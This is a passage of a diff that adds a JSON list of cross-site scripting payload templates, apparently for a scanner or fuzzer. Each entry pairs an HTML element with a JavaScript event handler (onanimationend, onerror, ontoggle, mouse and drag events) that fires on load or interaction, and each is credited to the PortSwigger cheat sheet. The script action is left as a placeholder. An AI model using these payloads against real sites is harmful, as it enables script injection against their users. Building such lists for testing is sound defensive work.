@@ -1,0 +1,1132 @@
+[
+{
+"id": "cs_onanimationend",
+"contexts": [
+"html_text"
+],
+"trigger": "load",
+"needs": "\"/<=>",
+"template": "<style>@keyframes x{}</style><xss style=\"animation-name:x\" onanimationend=\"{{marker}}\"></xss>",
+"why": "Fires when a CSS animation ends — onanimationend vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onanimationiteration",
+"contexts": [
+"html_text"
+],
+"trigger": "load",
+"needs": "\"/<=>",
+"template": "<style>@keyframes slidein {}</style><xss style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"{{marker}}\"></xss>",
+"why": "Fires when a CSS animation repeats — onanimationiteration vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onanimationstart",
+"contexts": [
+"html_text"
+],
+"trigger": "load",
+"needs": "\"/<=>",
+"template": "<style>@keyframes x{}</style><xss style=\"animation-name:x\" onanimationstart=\"{{marker}}\"></xss>",
+"why": "Fires when a CSS animation starts — onanimationstart vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onbegin",
+"contexts": [
+"html_text"
+],
+"trigger": "load",
+"needs": "<=>",
+"template": "<svg><animate onbegin={{marker}} attributeName=x dur=1s>",
+"why": "Fires when a svg animation begins — onbegin vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onend",
+"contexts": [
+"html_text"
+],
+"trigger": "load",
+"needs": "<=>",
+"template": "<svg><animate onend={{marker}} attributeName=x dur=1s>",
+"why": "Fires when a svg animation ends — onend vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onerror",
+"contexts": [
+"html_text"
+],
+"trigger": "load",
+"needs": "<=>",
+"template": "<audio src/onerror={{marker}}>",
+"why": "Fires when the resource fails to load or causes an error — onerror vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onfocus",
+"contexts": [
+"html_text"
+],
+"trigger": "load",
+"needs": "/<=>",
+"template": "<a id=x tabindex=1 onfocus={{marker}}></a>",
+"why": "Fires when the element has focus — onfocus vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onfocusin",
+"contexts": [
+"html_text"
+],
+"trigger": "load",
+"needs": "/<=>",
+"template": "<a id=x tabindex=1 onfocusin={{marker}}></a>",
+"why": "Fires when the element has focus — onfocusin vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onhashchange",
+"contexts": [
+"html_text"
+],
+"trigger": "load",
+"needs": "\"<=>",
+"template": "<body onhashchange=\"{{marker}}\">",
+"why": "Fires if the hash changes — onhashchange vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onload",
+"contexts": [
+"html_text"
+],
+"trigger": "load",
+"needs": "<=>",
+"template": "<body onload={{marker}}>",
+"why": "Fires when the element is loaded — onload vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onloadstart",
+"contexts": [
+"html_text"
+],
+"trigger": "load",
+"needs": "\"<=>",
+"template": "<audio onloadstart=\"{{marker}}\"><source>",
+"why": "onloadstart — onloadstart vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onmessage",
+"contexts": [
+"html_text"
+],
+"trigger": "load",
+"needs": "<=>",
+"template": "<body onmessage={{marker}}>",
+"why": "Fires when message event is received from a postMessage call — onmessage vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onpagereveal",
+"contexts": [
+"html_text"
+],
+"trigger": "load",
+"needs": "<=>",
+"template": "<body onpagereveal={{marker}}>",
+"why": "Fires when the page is shown — onpagereveal vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onpageshow",
+"contexts": [
+"html_text"
+],
+"trigger": "load",
+"needs": "<=>",
+"template": "<body onpageshow={{marker}}>",
+"why": "Fires when the page is shown — onpageshow vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onpopstate",
+"contexts": [
+"html_text"
+],
+"trigger": "load",
+"needs": "<=>",
+"template": "<body onpopstate={{marker}}>",
+"why": "Fires when the history changes — onpopstate vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onrepeat",
+"contexts": [
+"html_text"
+],
+"trigger": "load",
+"needs": "<=>",
+"template": "<svg><animate onrepeat={{marker}} attributeName=x dur=1s repeatCount=2 />",
+"why": "Fires when a svg animation repeats — onrepeat vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onresize",
+"contexts": [
+"html_text"
+],
+"trigger": "load",
+"needs": "\"<=>",
+"template": "<body onresize=\"{{marker}}\">",
+"why": "Fires when the window is resized — onresize vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onscroll",
+"contexts": [
+"html_text"
+],
+"trigger": "load",
+"needs": "/<=>",
+"template": "<body onscroll={{marker}}><div style=height:1000px></div><div id=x></div>",
+"why": "Fires when the page scrolls — onscroll vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onscrollend",
+"contexts": [
+"html_text"
+],
+"trigger": "load",
+"needs": "\"/<=>",
+"template": "<xss onscrollend={{marker}} style=\"display:block;overflow:auto;border:1px dashed;width:500px;height:100px;\"><br> <br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br> <br><br><br><br><br><span id=x>test</span></xss>",
+"why": "Fires when the scrolling to the end of the element — onscrollend vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onscrollsnapchange",
+"contexts": [
+"html_text"
+],
+"trigger": "load",
+"needs": "/<=>",
+"template": "<address onscrollsnapchange={{marker}} style=overflow-y:hidden;scroll-snap-type:x><div style=scroll-snap-align:center>1337</div></address>",
+"why": "Fires at the end of a scrolling operation — onscrollsnapchange vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onscrollsnapchanging",
+"contexts": [
+"html_text"
+],
+"trigger": "load",
+"needs": "\"/<=>",
+"template": "<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class=\"scroll-container\" onscrollsnapchanging=\"{{marker}}\"> <xss class=\"scroll-item\">Item 1</xss><xss class=\"scroll-item\">Item 2</xss></xss>",
+"why": "Fires when the scroll position is snapping to a new point — onscrollsnapchanging vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onsecuritypolicyviolation",
+"contexts": [
+"html_text"
+],
+"trigger": "load",
+"needs": "/<=>",
+"template": "<xss onsecuritypolicyviolation={{marker}}>XSS</xss>",
+"why": "Fires when a CSP violation occurs. This would be site specific — onsecuritypolicyviolation vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onslotchange",
+"contexts": [
+"html_text"
+],
+"trigger": "load",
+"needs": "<=>",
+"template": "x<template shadowrootmode=open><slot onslotchange={{marker}}>",
+"why": "Fires when the slot’s assigned content changes — onslotchange vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_ontoggle",
+"contexts": [
+"html_text"
+],
+"trigger": "load",
+"needs": "/<=>",
+"template": "<details ontoggle={{marker}} open>test</details>",
+"why": "Fires when the details tag is expanded — ontoggle vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_ontransitionend",
+"contexts": [
+"html_text"
+],
+"trigger": "load",
+"needs": "<=>",
+"template": "<xss autofocus style=transition:1s ontransitionend={{marker}} tabindex=1>",
+"why": "Fires when a CSS transition ends — ontransitionend vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onvalidationstatuschange",
+"contexts": [
+"html_text"
+],
+"trigger": "load",
+"needs": "<=>",
+"template": "<camera onvalidationstatuschange={{marker}}>",
+"why": "Fires when a form control’s validation state changes — onvalidationstatuschange vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onwebkitanimationend",
+"contexts": [
+"html_text"
+],
+"trigger": "load",
+"needs": "\"/<=>",
+"template": "<style>@keyframes x{}</style><xss style=\"animation-name:x\" onwebkitanimationend=\"{{marker}}\"></xss>",
+"why": "Fires when a CSS animation ends — onwebkitanimationend vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onwebkitanimationiteration",
+"contexts": [
+"html_text"
+],
+"trigger": "load",
+"needs": "\"/<=>",
+"template": "<style>@keyframes slidein {}</style><xss style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onwebkitanimationiteration=\"{{marker}}\"></xss>",
+"why": "Fires when a CSS animation repeats — onwebkitanimationiteration vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onwebkitanimationstart",
+"contexts": [
+"html_text"
+],
+"trigger": "load",
+"needs": "\"/<=>",
+"template": "<style>@keyframes x{}</style><xss style=\"animation-name:x\" onwebkitanimationstart=\"{{marker}}\"></xss>",
+"why": "Fires when a CSS animation starts — onwebkitanimationstart vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onwebkitneedkey",
+"contexts": [
+"html_text"
+],
+"trigger": "load",
+"needs": "/<=>",
+"template": "<audio src=data:,%23EXTM3U%0A%23EXT-X-TARGETDURATION:1%0A%23EXT-X-KEY:METHOD=AES-128,URI=%22skd:%22%0A%23EXTINF:1%0Ax onwebkitneedkey={{marker}}></audio>",
+"why": "Fires when an HTML media element encounters encrypted content and needs a decryption key from the page — onwebkitneedkey vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onwebkitplaybacktargetavailabilitychanged",
+"contexts": [
+"html_text"
+],
+"trigger": "load",
+"needs": "<=>",
+"template": "<audio onwebkitplaybacktargetavailabilitychanged={{marker}}>",
+"why": "Fires when the availability of an AirPlay playback target changes — onwebkitplaybacktargetavailabilitychanged vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onwebkittransitionend",
+"contexts": [
+"html_text"
+],
+"trigger": "load",
+"needs": "<=>",
+"template": "<xss style=transition:1s onwebkittransitionend={{marker}} tabindex=1 autofocus>",
+"why": "Fires when a CSS transition ends — onwebkittransitionend vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onbeforematch",
+"contexts": [
+"html_text"
+],
+"trigger": "load",
+"needs": "<=>",
+"template": "<input type=hidden id=x onbeforematch={{marker}} hidden=until-found>",
+"why": "Fires when a hidden element is revealed — onbeforematch vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_oncontentvisibilityautostatechange",
+"contexts": [
+"html_text"
+],
+"trigger": "load",
+"needs": "<=>",
+"template": "<xss oncontentvisibilityautostatechange={{marker}} style=display:block;content-visibility:auto>",
+"why": "Fires on all tags when content-visibility is set to auto — oncontentvisibilityautostatechange vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_ontransitioncancel",
+"contexts": [
+"html_text"
+],
+"trigger": "load",
+"needs": "\"/<=>",
+"template": "<style>:target {color: red;}</style><xss id=x style=\"transition:color 10s\" ontransitioncancel={{marker}}></xss>",
+"why": "Fires when a CSS transition cancels — ontransitioncancel vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_ontransitionrun",
+"contexts": [
+"html_text"
+],
+"trigger": "load",
+"needs": "\"/<=>",
+"template": "<style>:target {transform: rotate(180deg);}</style><xss id=x style=\"transition:transform 2s\" ontransitionrun={{marker}}></xss>",
+"why": "Fires when a CSS transition begins — ontransitionrun vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_ontransitionstart",
+"contexts": [
+"html_text"
+],
+"trigger": "load",
+"needs": "\"/<=>",
+"template": "<style>:target {color:red;}</style><xss id=x style=\"transition:color 1s\" ontransitionstart={{marker}}></xss>",
+"why": "Fires when a CSS transition starts — ontransitionstart vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onafterprint",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "<=>",
+"template": "<body onafterprint={{marker}}>",
+"why": "Fires after the page is printed — onafterprint vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onauxclick",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "<=>",
+"template": "<input onauxclick={{marker}}>",
+"why": "Fires when right clicking or using the middle button of the mouse — onauxclick vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onbeforecopy",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "\"/<=>",
+"template": "<a onbeforecopy=\"{{marker}}\" contenteditable>test</a>",
+"why": "onbeforecopy — onbeforecopy vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onbeforecut",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "\"/<=>",
+"template": "<a onbeforecut=\"{{marker}}\" contenteditable>test</a>",
+"why": "onbeforecut — onbeforecut vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onbeforeinput",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "<=>",
+"template": "<xss contenteditable onbeforeinput={{marker}}>test",
+"why": "Fires when the value of the element is about to be modified — onbeforeinput vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onbeforepaste",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "/<=>",
+"template": "<xss onbeforepaste={{marker}}>XSS</xss>",
+"why": "Fires at the end of a paste operation — onbeforepaste vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onbeforetoggle",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "/<=>",
+"template": "<button popovertarget=x>Click me</button><xss onbeforetoggle={{marker}} popover id=x>XSS</xss>",
+"why": "Fires before the a popop element is toggled — onbeforetoggle vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onblur",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "/<=>",
+"template": "<xss onblur={{marker}} id=x tabindex=1 style=display:block>test</xss><input value=clickme>",
+"why": "Fires when an element loses focus — onblur vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_oncancel",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "<=>",
+"template": "<input type=file oncancel={{marker}}>",
+"why": "Fires when an a file upload is cancelled — oncancel vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onchange",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "<=>",
+"template": "<input onchange={{marker}} value=xss>",
+"why": "onchange — onchange vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onclick",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "\"/<=>",
+"template": "<xss onclick=\"{{marker}}\" style=display:block>test</xss>",
+"why": "onclick — onclick vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onclose",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "/<=>",
+"template": "<dialog open onclose={{marker}}><form method=dialog><button>XSS</button></form>",
+"why": "Fires when a dialog is closed — onclose vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_oncommand",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "<=>",
+"template": "<button commandfor=test command=show-popover>Click<div id=test oncommand={{marker}}>",
+"why": "Fires when the command is sent via click — oncommand vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_oncontextmenu",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "\"/<=>",
+"template": "<xss oncontextmenu=\"{{marker}}\" style=display:block>test</xss>",
+"why": "oncontextmenu — oncontextmenu vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_oncopy",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "\"<=>",
+"template": "<xss oncopy={{marker}} value=\"XSS\" autofocus tabindex=1 style=display:block>test",
+"why": "oncopy — oncopy vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_oncut",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "\"<=>",
+"template": "<xss oncut={{marker}} value=\"XSS\" autofocus tabindex=1 style=display:block>test",
+"why": "oncut — oncut vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_ondblclick",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "\"/<=>",
+"template": "<xss ondblclick=\"{{marker}}\" autofocus tabindex=1 style=display:block>test</xss>",
+"why": "ondblclick — ondblclick vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_ondrag",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "\"/<=>",
+"template": "<xss draggable=\"true\" ondrag=\"{{marker}}\" style=display:block>test</xss>",
+"why": "ondrag — ondrag vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_ondragend",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "\"/<=>",
+"template": "<xss draggable=\"true\" ondragend=\"{{marker}}\" style=display:block>test</xss>",
+"why": "ondragend — ondragend vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_ondragenter",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "\"/<=>",
+"template": "<xss draggable=\"true\" ondragenter=\"{{marker}}\" style=display:block>test</xss>",
+"why": "ondragenter — ondragenter vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_ondragexit",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "\"/<=>",
+"template": "<xss draggable=\"true\" ondragexit=\"{{marker}}\" style=display:block>test</xss>",
+"why": "ondragexit — ondragexit vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_ondragleave",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "\"/<=>",
+"template": "<xss draggable=\"true\" ondragleave=\"{{marker}}\" style=display:block>test</xss>",
+"why": "ondragleave — ondragleave vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_ondragover",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "\"/<=>",
+"template": "<div draggable=\"true\" contenteditable>drag me</div><xss ondragover={{marker}} contenteditable style=display:block>drop here</xss>",
+"why": "ondragover — ondragover vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_ondragstart",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "\"/<=>",
+"template": "<xss draggable=\"true\" ondragstart=\"{{marker}}\" style=display:block>test</xss>",
+"why": "ondragstart — ondragstart vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_ondrop",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "\"/<=>",
+"template": "<div draggable=\"true\" contenteditable>drag me</div><xss ondrop={{marker}} contenteditable style=display:block>drop here</xss>",
+"why": "ondrop — ondrop vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onfocusout",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "/<=>",
+"template": "<xss onfocusout={{marker}} autofocus tabindex=1 style=display:block>test</xss><input value=clickme>",
+"why": "Fires when an element loses focus — onfocusout vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onformdata",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "\"/<=>",
+"template": "<form onformdata=\"{{marker}}\"><button>Click</button></form>",
+"why": "onformdata — onformdata vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_ongesturechange",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "/<=>",
+"template": "<div ongesturechange={{marker}}>XSS</div>",
+"why": "Fires when the gesture is in progress and changes occur — ongesturechange vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_ongestureend",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "/<=>",
+"template": "<div ongestureend={{marker}}>XSS</div>",
+"why": "Fires when the gesture comes to an end — ongestureend vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_ongesturestart",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "/<=>",
+"template": "<div ongesturestart={{marker}}>XSS</div>",
+"why": "Fires when multiple fingers touch the surface, initiating a new gesture — ongesturestart vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_ongotpointercapture",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "<=>",
+"template": "<input type=range ongotpointercapture={{marker}}>",
+"why": "ongotpointercapture — ongotpointercapture vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_oninput",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "<=>",
+"template": "<input oninput={{marker}} value=xss>",
+"why": "oninput — oninput vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_oninvalid",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "<=>",
+"template": "<form><input oninvalid={{marker}} required><input type=submit>",
+"why": "oninvalid — oninvalid vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onkeydown",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "\"/<=>",
+"template": "<xss onkeydown=\"{{marker}}\" contenteditable style=display:block>test</xss>",
+"why": "onkeydown — onkeydown vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onkeypress",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "\"/<=>",
+"template": "<xss onkeypress=\"{{marker}}\" contenteditable style=display:block>test</xss>",
+"why": "onkeypress — onkeypress vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onkeyup",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "\"/<=>",
+"template": "<xss onkeyup=\"{{marker}}\" contenteditable style=display:block>test</xss>",
+"why": "onkeyup — onkeyup vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onlocation",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "<=>",
+"template": "<geolocation autolocate onlocation={{marker}}>",
+"why": "Fires when the browser requests the user’s location after permission is granted — onlocation vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onlostpointercapture",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "<=>",
+"template": "<input type=range onlostpointercapture={{marker}}>",
+"why": "onlostpointercapture — onlostpointercapture vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onmousedown",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "\"/<=>",
+"template": "<xss onmousedown=\"{{marker}}\" style=display:block>test</xss>",
+"why": "onmousedown — onmousedown vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onmouseenter",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "\"/<=>",
+"template": "<xss onmouseenter=\"{{marker}}\" style=display:block>test</xss>",
+"why": "onmouseenter — onmouseenter vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onmouseleave",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "\"/<=>",
+"template": "<xss onmouseleave=\"{{marker}}\" style=display:block>test</xss>",
+"why": "onmouseleave — onmouseleave vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onmousemove",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "\"/<=>",
+"template": "<xss onmousemove=\"{{marker}}\" style=display:block>test</xss>",
+"why": "onmousemove — onmousemove vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onmouseout",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "\"/<=>",
+"template": "<xss onmouseout=\"{{marker}}\" style=display:block>test</xss>",
+"why": "onmouseout — onmouseout vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onmouseover",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "\"/<=>",
+"template": "<xss onmouseover=\"{{marker}}\" style=display:block>test</xss>",
+"why": "onmouseover — onmouseover vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onmouseup",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "\"/<=>",
+"template": "<xss onmouseup=\"{{marker}}\" style=display:block>test</xss>",
+"why": "onmouseup — onmouseup vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onmousewheel",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "<=>",
+"template": "<xss onmousewheel={{marker}} style=display:block>requires scrolling",
+"why": "Fires when the mousewheel scrolls — onmousewheel vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onpaste",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "\"/<=>",
+"template": "<a onpaste=\"{{marker}}\" contenteditable>test</a>",
+"why": "onpaste — onpaste vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onpointercancel",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "/<=>",
+"template": "<xss onpointercancel={{marker}}>XSS</xss>",
+"why": "onpointercancel — onpointercancel vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onpointerdown",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "/<=>",
+"template": "<xss onpointerdown={{marker}} style=display:block>XSS</xss>",
+"why": "Fires when the mouse down — onpointerdown vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onpointerenter",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "/<=>",
+"template": "<xss onpointerenter={{marker}} style=display:block>XSS</xss>",
+"why": "Fires when the mouseenter — onpointerenter vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onpointerleave",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "/<=>",
+"template": "<xss onpointerleave={{marker}} style=display:block>XSS</xss>",
+"why": "Fires when the mouseleave — onpointerleave vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onpointermove",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "/<=>",
+"template": "<xss onpointermove={{marker}} style=display:block>XSS</xss>",
+"why": "Fires when the mouse move — onpointermove vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onpointerout",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "/<=>",
+"template": "<xss onpointerout={{marker}} style=display:block>XSS</xss>",
+"why": "Fires when the mouse out — onpointerout vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onpointerover",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "/<=>",
+"template": "<xss onpointerover={{marker}} style=display:block>XSS</xss>",
+"why": "Fires when the mouseover — onpointerover vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onpointerrawupdate",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "/<=>",
+"template": "<xss onpointerrawupdate={{marker}} style=display:block>XSS</xss>",
+"why": "Fires when the pointer changes — onpointerrawupdate vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onpointerup",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "/<=>",
+"template": "<xss onpointerup={{marker}} style=display:block>XSS</xss>",
+"why": "Fires when the mouse up — onpointerup vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onpromptaction",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "<=>",
+"template": "<geolocation onpromptaction={{marker}}>",
+"why": "Fires when the user takes an action in the prompt (such as confirm) — onpromptaction vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onpromptdismiss",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "<=>",
+"template": "<geolocation onpromptdismiss={{marker}}>",
+"why": "Fires when the user opens the prompt and closes it without responding — onpromptdismiss vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onreset",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "<=>",
+"template": "<form onreset={{marker}}><input type=reset>",
+"why": "onreset — onreset vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onsearch",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "\"<=>",
+"template": "<form><input type=search onsearch={{marker}} value=\"Hit return\" autofocus>",
+"why": "Fires when a form is submitted and the input has a type attribute of search — onsearch vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onselect",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "\"<=>",
+"template": "<input onselect={{marker}} value=\"XSS\" autofocus>",
+"why": "onselect — onselect vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onselectionchange",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "<=>",
+"template": "<body onselectionchange={{marker}}>select some text",
+"why": "Fires when text selection is changed on the page — onselectionchange vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onselectstart",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "<=>",
+"template": "<body onselectstart={{marker}}>select some text",
+"why": "Fires when beginning a text selection — onselectstart vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onstream",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "<=>",
+"template": "<usermedia onstream={{marker}}>",
+"why": "Fires when the user grants permission — onstream vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_onsubmit",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "<=>",
+"template": "<form onsubmit={{marker}}><input type=submit>",
+"why": "onsubmit — onsubmit vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_ontouchcancel",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "/<=>",
+"template": "<xss ontouchcancel={{marker}}>XSS</xss>",
+"why": "Fires when the select text, only mobile device — ontouchcancel vector from the PortSwigger cheat sheet"
+},
+{
+"id": "cs_ontouchend",
+"contexts": [
+"html_text"
+],
+"trigger": "interaction",
+"needs": "<=>",
+"template": "<body ontouchend={{marker}}>",
+"why": "Fires when the touch screen, only mobile device — ontouchend vector from the PortSwigger cheat sheet"
+},
